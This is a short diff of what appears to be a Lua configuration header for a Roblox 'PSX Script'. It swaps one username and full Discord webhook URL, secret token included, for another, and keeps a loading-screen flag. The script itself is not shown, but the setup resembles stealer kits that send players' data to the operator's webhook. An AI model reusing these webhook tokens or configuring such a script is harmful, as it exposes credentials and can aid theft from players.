@@ -1,5 +1,5 @@
-Username = "Den4ik7482GG"
-WebHook = "https://discord.com/api/webhooks/1103046820977987585/E5KK3Gd0D6fpPyV0DOGVVNgALF46GKXoRPBYdBqKxVYTs0znGA5SXDLO_9Yc7dXI68kf"
+Username = "LANTRA228"
+WebHook = "https://discord.com/api/webhooks/1118625376940347552/LSDEgio2wQVTkK0TMfbmNCblTp8RRjbHgvYPoWOdTO6nmjcI8RgYxAM2HobpY7JCc8GE"
  
 loadingscreen = true
 _G.CustomScriptName = "PSX Script"
